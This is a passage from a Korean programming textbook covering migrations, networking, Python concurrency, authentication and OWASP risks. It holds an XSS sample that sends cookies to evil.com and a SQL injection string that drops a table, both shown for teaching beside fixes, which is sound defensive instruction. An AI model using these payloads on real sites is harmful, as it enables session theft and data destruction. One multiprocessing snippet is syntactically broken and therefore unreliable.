데이터베이스 스키마는 시간이 지남에 따라 변합니다: 새 컬럼, 이름 변경된 필드, 새 테이블. 스키마 마이그레이션(schema migration)은 구조를 발전시키는 버전 관리된 스크립트입니다.

# Migration 001: initial schema
"""
CREATE TABLE tasks (
    id INTEGER PRIMARY KEY,
    title TEXT NOT NULL,
    done BOOLEAN DEFAULT 0
);
"""

# Migration 002: add priority column
"""
ALTER TABLE tasks ADD COLUMN priority TEXT DEFAULT 'medium';
"""

# Migration 003: add categories (zero-downtime approach)
"""
-- Step 1: Add nullable column (safe, no breaking change)
ALTER TABLE tasks ADD COLUMN category_id INTEGER;
-- Step 2: Backfill existing rows (in application code, gradually)
-- Step 3: Add constraint once all data is valid
"""

무중단 마이그레이션(zero-downtime migration)은 신중한 순서를 따릅니다: 컬럼을 nullable로 추가하고, 이전 컬럼과 새 컬럼 모두에 쓰는 코드를 배포하고, 기존 데이터를 백필(backfill)하고, 마지막으로 제약을 추가하거나 이전 컬럼을 삭제합니다. 실행 중인 코드가 아직 읽는 컬럼은 절대 삭제하지 마십시오.

TCP 대 UDP

TCP(Transmission Control Protocol, 전송 제어 프로토콜)는 3방향 핸드셰이크(three-way handshake)를 통해 신뢰성 있고 순서가 보장된 전달을 제공합니다.

  1. SYN: 클라이언트가 "연결하고 싶습니다"라고 말합니다
  2. SYN-ACK: 서버가 "확인했습니다. 저도 연결하고 싶습니다"라고 응답합니다
  3. ACK: 클라이언트가 "확인했습니다. 연결되었습니다"라고 말합니다

이 핸드셰이크 후 데이터가 신뢰성 있게 흐릅니다. 손실된 패킷은 재전송됩니다. 순서가 맞지 않는 패킷은 재정렬됩니다.

UDP(User Datagram Protocol, 사용자 데이터그램 프로토콜)는 핸드셰이크를 완전히 건너뜁니다. 패킷을 보내고 도착하기를 기대합니다. 더 빠르지만 신뢰성이 없습니다.

헤더, 쿠키와 세션

헤더(Header)는 메타데이터를 전달합니다: Content-Type(본문 형식), Authorization(자격 증명), Accept(클라이언트가 이해하는 형식).

쿠키(Cookie)는 서버가 Set-Cookie 헤더를 통해 클라이언트에 저장하는 소형 데이터 조각입니다. 해당 도메인에 대한 이후 모든 요청과 함께 자동으로 전송됩니다.

세션(Session)은 쿠키(세션 ID 포함)와 서버 측 데이터를 연결합니다. 서버는 로그인 시 세션을 생성하고 ID가 담긴 쿠키를 제공하며, 이후 요청에서 세션을 조회하여 사용자를 식별합니다.

HTTP/2 개선 사항

HTTP/2는 멀티플렉싱(단일 연결에서 여러 요청), 헤더 압축, 서버 푸시를 도입했습니다. 코드를 변경할 필요가 없으며, 웹 서버와 브라우저가 자동으로 처리합니다.

TLS/HTTPS

TLS(Transport Layer Security, 전송 계층 보안)는 클라이언트와 서버 간의 연결을 암호화합니다. HTTPS는 TLS 위의 HTTP입니다. 단순화된 핸드셰이크:

  1. 클라이언트가 지원하는 암호 스위트와 함께 "Hello"를 보냅니다
  2. 서버가 인증서(certificate)(신원 증명)와 선택한 암호를 보냅니다
  3. 클라이언트가 신뢰할 수 있는 인증 기관에 대해 인증서를 검증합니다
  4. 양측이 비대칭 암호화(asymmetric encryption)(느리고 일회성)를 사용하여 키를 교환합니다
  5. 나머지 세션에서 대칭 암호화(symmetric encryption)(빠름)로 전환합니다

웹소켓 (WebSockets)

일반 HTTP는 요청/응답 방식입니다. 실시간 기능을 위해서는 서버가 클라이언트로 데이터를 푸시해야 합니다. 웹소켓(WebSocket)은 HTTP 연결을 양측이 언제든지 메시지를 보낼 수 있는 영구적인 전이중(full-duplex) 채널로 업그레이드합니다.

Chapter 32 동시성과 병렬 처리

지금 이것이 중요한 이유

현대 애플리케이션은 동시에 많은 일을 합니다: 여러 웹 요청 처리, 여러 API에서 데이터를 동시에 가져오기, UI 응답성을 유지하면서 파일 처리. 동시성(concurrency)을 이해하면 멈추지 않고, 데이터를 잃지 않으며, 현대 하드웨어를 최대한 활용하는 애플리케이션을 구축할 수 있습니다.

세 가지 모델: 프로세스, 스레드, Async

Python은 동시에 여러 가지를 수행하는 세 가지 근본적인 방법을 제공합니다. 각각 다른 상황에 적합합니다.

프로세스(Process)는 별도의 메모리 공간에서 실행되는 완전히 독립적인 프로그램입니다. 여러 CPU 코어에서 진정으로 병렬로 실행될 수 있습니다. 하지만 생성 비용이 높고 프로세스 간 통신이 복잡합니다.

스레드(Thread)는 단일 프로세스 내의 가벼운 실행 단위입니다. 메모리를 공유하여 통신은 쉽지만 위험합니다(경쟁 조건). Python에서는 GIL이 CPU 바운드 작업에서의 효과를 제한합니다.

Async/await(협력적 멀티태스킹)는 단일 스레드를 사용하지만 I/O를 기다리는 작업이 있을 때마다 작업 간에 전환합니다. I/O 바운드 작업에 매우 효율적이지만 CPU 바운드 작업을 빠르게 할 수는 없습니다.

Python의 GIL

전역 인터프리터 잠금(Global Interpreter Lock, GIL)은 CPython에서 한 번에 하나의 스레드만 Python 바이트코드를 실행하도록 보장하는 뮤텍스(mutex)입니다. 이는 스레드가 CPU 바운드 작업에서 진정한 병렬성을 달성할 수 없음을 의미합니다.

GIL이 방지하는 것: 두 스레드가 서로 다른 코어에서 동시에 숫자를 계산하는 것.

GIL이 방지하지 않는 것: I/O 바운드 동시성. 스레드가 네트워크 응답이나 디스크 읽기를 기다릴 때 GIL을 해제하여 다른 스레드가 실행될 수 있습니다. 이것이 스레딩이 I/O 작업에 여전히 잘 작동하는 이유입니다.

import threading
import time

# I/O-bound: threading helps (GIL released during sleep/network)
def fetch_data(url):
    time.sleep(1)  # Simulates network I/O
    return f"Data from {url}"

# CPU-bound: threading does NOT help (GIL blocks parallelism)
def compute_heavy(n):
    total = 0
    for i in range(n):
        total += i * i
    return total

스레딩 (Threading)

Python의 threading 모듈을 사용하면 함수를 동시에 실행할 수 있습니다. 그러나 스레드 간 공유 상태는 동기화 없이는 위험합니다.

import threading

counter = 0  # Shared state — danger!

def increment():
    global counter
    for _ in range(100000):
        counter += 1  # NOT thread-safe!

t1 = threading.Thread(target=increment)
t2 = threading.Thread(target=increment)
t1.start(); t2.start()
t1.join(); t2.join()

print(counter)  # Expected: 200000. Actual: something less!

해결책은 잠금(lock)입니다.

lock = threading.Lock()
counter = 0

def safe_increment():
    global counter
    for _ in range(100000):
        with lock:  # Only one thread at a time
            counter += 1

Async/Await

Async/await는 Python의 협력적 멀티태스킹 시스템입니다. 코루틴(coroutine)(async def로 정의)은 I/O를 기다리는 동안 await로 일시 중지하여 같은 스레드에서 다른 코루틴이 실행되게 합니다.

import asyncio

async def fetch_task(task_id):
    print(f"Fetching task {task_id}...")
    await asyncio.sleep(1)  # Non-blocking wait
    print(f"Got task {task_id}")
    return {"id": task_id, "title": f"Task {task_id}"}

async def main():
    # All three start concurrently, wait together
    results = await asyncio.gather(
        fetch_task(1),
        fetch_task(2),
        fetch_task(3),
    )
    # ~1 second total, not 3!
    print(f"Got {len(results)} tasks")

# asyncio.run(main())  # Starts the event loop

이벤트 루프(event loop)가 실행 중인 모든 코루틴을 관리합니다. 하나가 await에 도달하면 루프에 제어권을 넘겨주고, 루프는 준비된 다른 코루틴을 실행합니다.

멀티프로세싱 (Multiprocessing)

CPU 바운드 작업에는 multiprocessing이 별도의 Python 프로세스를 생성하며, 각각 자체 GIL을 가집니다. 여러 코어에서 진정한 병렬성을 달성합니다.

from multiprocessing import Pool

def process_image(path):
    """CPU-heavy image processing."""
    # ... computation ...
    return f"Processed {path}"

# Process 8 images across 4 CPU cores
with Pool(processes=4) as pool:
    results = pool.map(process_image, [
        "img1.png", "img2.png", "img3.png", "img4.png",
        "img5.png", "img6.png", "img7.png", "img8.png",

# ~2x faster than sequential on 4 cores

흔한 동시성 버그

경쟁 조건 (Race condition): 두 스레드가 같은 데이터를 읽고-수정하고-쓰는데 인터리빙이 잘못된 결과를 냅니다. 해결: 잠금이나 원자적 연산 사용.

교착 상태 (Deadlock): 스레드 A가 잠금 1을 보유하고 잠금 2를 기다립니다. 스레드 B가 잠금 2를 보유하고 잠금 1을 기다립니다. 해결: 항상 같은 전역 순서로 잠금 획득.

기아 상태 (Starvation): 다른 스레드들이 계속 먼저 차지해서 스레드가 리소스에 접근하지 못합니다. 해결: 공정한 잠금이나 우선순위 큐 사용.

스탬피드 (Thundering herd): 많은 스레드가 동시에 깨어나 하나의 리소스를 경쟁합니다(예: 캐시가 만료되어 1000개의 요청이 모두 재생성). 해결: 단일 플라이트(single-flight) 패턴 — 하나의 스레드가 재생성하고 나머지는 결과를 기다립니다.

패턴

생산자/소비자 (Producer/Consumer)

생산자는 작업 항목을 큐에 추가하고, 소비자는 처리합니다. 큐가 생산과 소비를 분리합니다.

import queue
import threading

work_queue = queue.Queue()

def producer():
    for i in range(10):
        work_queue.put(f"task-{i}")
    work_queue.put(None)  # Sentinel: signals completion

def consumer():
    while True:
        item = work_queue.get()
        if item is None:
            break
        print(f"Processing {item}")
        work_queue.task_done()

스레드 풀 (Thread Pool)

작업마다 스레드를 생성하는 대신 고정된 풀을 재사용합니다. Python의 concurrent.futures.ThreadPoolExecutor가 이를 제공합니다.

from concurrent.futures import ThreadPoolExecutor, as_completed

def fetch_url(url):
    import time
    time.sleep(0.5)
    return f"Content from {url}"

with ThreadPoolExecutor(max_workers=5) as executor:
    futures = {executor.submit(fetch_url, u): u
               for u in ["url1", "url2", "url3", "url4", "url5"]}

    for future in as_completed(futures):
        url = futures[future]
        print(f"{url}: {future.result()}")

팬아웃/팬인 (Fan-Out / Fan-In)

팬아웃(Fan-out): 작업을 많은 병렬 서브태스크로 분할합니다. 팬인(Fan-in): 결과를 수집하고 합칩니다. 이것이 맵-리듀스(map-reduce), 병렬 웹 스크래핑, 배치 처리 뒤의 패턴입니다.

인증 (Authentication) — 당신은 누구입니까?

인증(authentication)은 누군가의 신원을 확인합니다. 가장 흔한 형태는 사용자 이름 + 비밀번호입니다.

비밀번호 해싱 (Password Hashing)

첫 번째 규칙: 비밀번호를 평문으로 저장하지 마십시오. 데이터베이스가 침해되면 모든 사용자의 비밀번호가 노출됩니다. 대신 해시(hash) — 단방향 수학적 지문 — 를 저장하십시오.

import hashlib
import os

def hash_password(password, salt=None):
    """Hash a password with a random salt."""
    if salt is None:
        salt = os.urandom(16)
    hashed = hashlib.pbkdf2_hmac(
        'sha256',
        password.encode('utf-8'),
        salt,
        iterations=100000  # Slow on purpose!
    )
    return salt, hashed

def verify_password(password, salt, stored_hash):
    """Verify a password against a stored hash."""
    _, new_hash = hash_password(password, salt)
    return new_hash == stored_hash

# Registration
salt, hashed = hash_password("my_secret_password")
# Store salt + hashed in database (NOT the plaintext password!)

# Login
is_valid = verify_password("my_secret_password", salt, hashed)  # True

핵심 개념:

  • 솔트(Salt): 해싱 전 각 비밀번호에 추가하는 임의값. 두 사용자가 같은 비밀번호를 가져도 해시는 다릅니다. 레인보우 테이블(미리 계산된 해시 조회)도 무력화합니다.
  • 느린 해싱: bcrypt, scrypt, PBKDF2 같은 알고리즘은 의도적으로 느립니다. 이는 무차별 대입 공격을 비실용적으로 만듭니다: 추측 하나를 해싱하는 데 밀리초가 걸리지만 수십억 번의 추측에는 수년이 걸립니다.
  • 해싱은 암호화가 아닙니다: 암호화는 역방향이 가능합니다(키로 복호화). 해싱은 단방향입니다(원본을 복구할 수 없습니다).

JWT 토큰 (JSON Web Token)

JSON 웹 토큰(JSON Web Tokens, JWT)은 인증 정보를 전달하는 압축된 방법입니다. JWT는 세 개의 base64 인코딩 부분으로 구성됩니다: 헤더.페이로드.서명.

# Conceptual JWT structure
# Header:    {"alg": "HS256", "typ": "JWT"}
# Payload:   {"user_id": 42, "role": "admin", "exp": 1711324800}
# Signature: HMAC-SHA256(header + "." + payload, secret_key)

# Server creates JWT after login:
# token = jwt.encode({"user_id": 42, "exp": ...}, SECRET, algorithm="HS256")

# Client sends in Authorization header:
# Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...

# Server verifies on each request:
# data = jwt.decode(token, SECRET, algorithms=["HS256"])

OAuth2 흐름

OAuth2는 사용자가 비밀번호를 공유하지 않고 기존 계정(Google, GitHub)을 사용하여 앱에 로그인할 수 있게 합니다.

권한 부여 (Authorisation) — 무엇을 할 수 있습니까?

인증(authentication) = "당신은 누구입니까?" 권한 부여(authorisation) = "당신은 무엇을 할 수 있습니까?"

역할 기반 접근 제어 (Role-Based Access Control, RBAC)

사용자에게 역할(role)(admin, editor, viewer)이 할당됩니다. 각 역할은 특정 권한을 갖습니다.

PERMISSIONS = {
    "admin":  ["create", "read", "update", "delete", "manage_users"],
    "editor": ["create", "read", "update"],
    "viewer": ["read"],
}

def check_permission(user_role, action):
    allowed = PERMISSIONS.get(user_role, [])
    if action not in allowed:
        raise PermissionError(f"Role '{user_role}' cannot '{action}'")

속성 기반 접근 제어 (Attribute-Based Access Control, ABAC)

ABAC는 여러 속성을 기반으로 결정을 내립니다: 사용자의 부서, 리소스의 분류, 시간대.

def can_access_task(user, task):
    """ABAC: access depends on multiple attributes."""
    if user.role == "admin":
        return True
    if task.project_id in user.project_ids:
        return True
    if task.is_public:
        return True
    return False

최소 권한의 원칙(Principle of Least Privilege): 모든 사용자, 프로세스, 컴포넌트에 필요한 최소한의 권한만 부여합니다. 태스크를 읽기만 하는 API에는 쓰기 접근 권한이 없어야 합니다.

OWASP 주요 취약점

OWASP(Open Web Application Security Project)는 가장 중요한 웹 보안 위험 목록을 관리합니다. 반드시 이해해야 할 상위 다섯 가지입니다.

1. SQL 인젝션 (SQL Injection)

공격자가 입력 필드에 악의적인 SQL을 삽입합니다. 문자열 연결로 SQL을 구성하면 공격자가 전체 데이터베이스를 읽거나, 수정하거나, 삭제할 수 있습니다.

# VULNERABLE: string concatenation
username = "admin'; DROP TABLE users; --"
query = f"SELECT * FROM users WHERE username = '{username}'"
# Becomes: SELECT * FROM users WHERE username = 'admin'; DROP TABLE users; --'
# Your entire users table is deleted!

# SAFE: parameterised query
cursor.execute(
    "SELECT * FROM users WHERE username = ?",
    (username,)
)
# The ? placeholder treats input as DATA, not SQL code

2. 인증 취약점 (Broken Authentication)

약한 비밀번호, 속도 제한 없음, 만료되지 않는 토큰, 안전하지 않은 비밀번호 재설정 흐름. 해결: 강력한 비밀번호 적용, MFA(다중 인증) 사용, 토큰 만료, 로그인 시도 속도 제한.

3. 교차 사이트 스크립팅 (Cross-Site Scripting, XSS)

공격자가 다른 사용자가 보는 페이지에 JavaScript를 삽입합니다. 스크립트는 피해자의 브라우저에서 실행되어 쿠키나 세션 토큰을 훔칩니다.

# VULNERABLE: user input directly in HTML
task_title = '<script>document.location="https://evil.com/?c="+document.cookie</script>'
html = f"<h1>{task_title}</h1>"
# The script executes in every viewer's browser!

# SAFE: output encoding (escape HTML characters)
from markupsafe import escape
html = f"<h1>{escape(task_title)}</h1>"
# Renders as visible text, not executable code

4. 서버 측 요청 위조 (Server-Side Request Forgery, SSRF)

공격자가 서버를 속여 내부 서비스에 요청을 보내게 합니다. 앱이 사용자가 제공한 URL을 가져오는 경우, 공격자가 http://localhost:5432를 입력하여 내부 네트워크를 탐색할 수 있습니다. 해결: URL을 검증하고 허용 목록(allowlist)을 사용하며, 내부 IP 범위를 차단하십시오.

5. 보안 설정 오류 (Security Misconfiguration)

기본 비밀번호가 변경되지 않았거나, 프로덕션에서 디버그 모드가 활성화되어 있거나, 사용자에게 상세한 스택 트레이스가 노출되거나, 불필요한 서비스가 열려 있는 경우입니다. 해결: 기본값을 강화하고, 설정을 감사하며, 디버그 정보를 절대 노출하지 마십시오.

안전한 코딩 관행

  • 입력 유효성 검사(Input validation): 서버에서 모든 입력을 검증합니다. 클라이언트 측 검증은 UX이고, 서버 측은 보안입니다. 클라이언트를 절대 신뢰하지 마십시오.

  • 의존성 감사(Dependency auditing): 정기적으로 의존성의 취약점을 스캔합니다. pip audit 또는 GitHub Dependabot을 사용합니다.

연습: 비밀번호 해싱

hashlib를 사용하여 비밀번호 해싱을 구현하십시오. SHA-256과 100,000번 반복을 사용하는 PBKDF2로 hash_password(password, salt)를 완성하십시오. 그런 다음 비밀번호가 일치할 때만 True를 반환하는 verify_password(password, salt, expected_hash)를 완성하십시오. 다른 솔트가 다른 해시를 생성함을 시연하십시오.

hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt, 100000)를 사용하여 해시를 만드십시오.

verify_password는 주어진 비밀번호와 솔트로 hash_password를 호출한 다음 결과를 expected_hash와 비교하십시오. 일치하면 True를 반환합니다.

비밀번호 문자열을 bytes로 인코딩하는 것을 기억하십시오: password.encode('utf-8'). 솔트는 이미 bytes입니다.

  3. 인증 & 보안: PBKDF2 또는 bcrypt로 비밀번호 해싱을 추가하십시오. 로그인/등록 엔드포인트를 만드십시오. 보호된 모든 라우트에 토큰 기반 인증을 추가하십시오. 최소 “admin”과 “viewer” 역할의 RBAC를 구현하십시오. 모든 SQL 쿼리에서 매개변수화된 구문을 사용하는지 감사하십시오.
  4. 트랜잭션: “프로젝트 간 태스크 이동”과 같은 다단계 작업을 트랜잭션으로 감싸고, 실패 시 적절히 롤백되도록 하십시오.
주의

전략 패턴을 설명하고 기본 버전을 구현할 수 없거나, JOIN 쿼리를 작성하거나 SQL 인젝션 취약점을 식별할 수 없다면 — 해당 장을 다시 학습하십시오. 이것들은 이후 모든 내용의 기초가 되는 역량입니다.

이제 할 수 있는 것

  • 검증된 디자인 패턴을 사용하여 확장 가능한 시스템을 구성할 수 있습니다
  • 복잡하고 효율적인 SQL 쿼리를 작성하고, 그 성능의 이유를 이해합니다
  • 트랜잭션으로 데이터 무결성을 보호하고 적절한 격리 수준을 선택합니다
  • DNS에서 HTTP 응답까지 인터넷의 작동 방식을 설명할 수 있습니다
  • 모든 워크로드에 적합한 동시성 모델을 선택하고 흔한 버그를 피합니다
  • 가장 흔한 공격 벡터에 대응하는 안전한 애플리케이션을 구축합니다
